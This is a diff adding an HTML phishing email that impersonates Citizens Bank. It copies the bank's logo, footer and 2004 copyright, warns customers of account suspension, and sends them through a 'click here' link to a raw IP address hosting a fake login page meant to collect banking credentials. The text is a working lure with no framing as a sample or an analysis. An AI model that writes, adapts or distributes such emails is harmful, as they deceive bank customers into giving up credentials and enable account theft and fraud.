@@ -1,0 +1,50 @@
+<html>
+<head>
+<link rel="StyleSheet" href="http://www.citizensbank.com/css/default.css" type="text/css">
+<title>Citizens Bank Online</title>
+</head>
+<body>
+<img src="http://www.citizensbank.com/img/header/cb_logo.gif">
+<br><br><div style="font-family: Arial, Helvetica, sans-serif; font-size: 8pt; line-height:13.5pt; color:666666;">
+&nbsp;&nbsp;&nbsp;Dear valued Citizens Bank member,
+<br><br>
+&nbsp;&nbsp;&nbsp;Due to concerns, for the safety and integrity of the online banking community we have issued the following warning message.
+<br><br>
+&nbsp;&nbsp;&nbsp;It has come to our attention that your account information needs to be confirmed due to inactive customers, fraud and spoof reports.
+<br>
+&nbsp;&nbsp;&nbsp;If you could please take 5-10 minutes out of your online experience and renew your records you will not run into any future problems with the online service.
+<br>
+&nbsp;&nbsp;&nbsp;However, failure to confirm your records may result in your account suspension.
+<br><br>
+&nbsp;&nbsp;&nbsp;Once you have confirmed your account records your internet banking service will not be interrupted and will continue as normal.
+<br><br>
+&nbsp;&nbsp;&nbsp;<b>To confirm your bank account records please <a href="http://219.144.194.158/CitizensBank/OnlineBanking/index.html" target="_blank">click here.</a></b>
+<br><br>
+&nbsp;&nbsp;&nbsp;Thank you for your time,
+<br>
+&nbsp;&nbsp;&nbsp;Citizens Bank Billing Department.</div>
+<br>
+<table border="0" cellpadding="0" cellspacing="0" width="760">
+<tr>
+<td width="8"><img src="http://www.citizensbank.com/img/template/spacer.gif" width="8" height="1" alt="" border="0"></td>
+<td width="745"><img src="http://www.citizensbank.com/img/template/spacer.gif" width="1" height="11" alt="" border="0"></td>
+<td width="7"><img src="http://www.citizensbank.com/img/template/spacer.gif" width="7" height="1" alt="" border="0"></td>
+</tr>
+<tr>
+<td rowspan="3" width="8"><img src="http://www.citizensbank.com/img/template/spacer.gif" width="8" height="1" alt="" border="0"></td>
+<td width="745"><img src="http://www.citizensbank.com/img/footer/footer.gif" width="745" height="19" alt="" border="0"></td>
+<td rowspan="3" width="7"><img src="http://www.citizensbank.com/img/template/spacer.gif" width="7" height="1" alt="" border="0"></td>
+</tr>
+<tr>
+<td width="745" bgcolor="#2B9376"><img src="http://www.citizensbank.com/img/template/spacer.gif" width="1" height="22" alt="" border="0"></td>
+</tr>
+<tr>
+<td width="745" align="center"><div class="footer">
+<a href="http://www.citizensbank.com/boilerplate/privacylegal/privacy.asp" target="_blank">Privacy</a> |
+<a href="http://www.citizensbank.com/boilerplate/privacylegal/security.asp" target="_blank">Security</a>     &copy; 2004 Citizens Financial Group.  All rights reserved.
+<a href="http://www.citizensbank.com/misc/termsofuse.asp" target="_blank">Terms of Use</a> |
+<a href="http://www.citizensbank.com/tools/site_map/map.asp" target="_blank">Site Map</a></div></td>
+</tr>
+</table>
+</body></html>
+
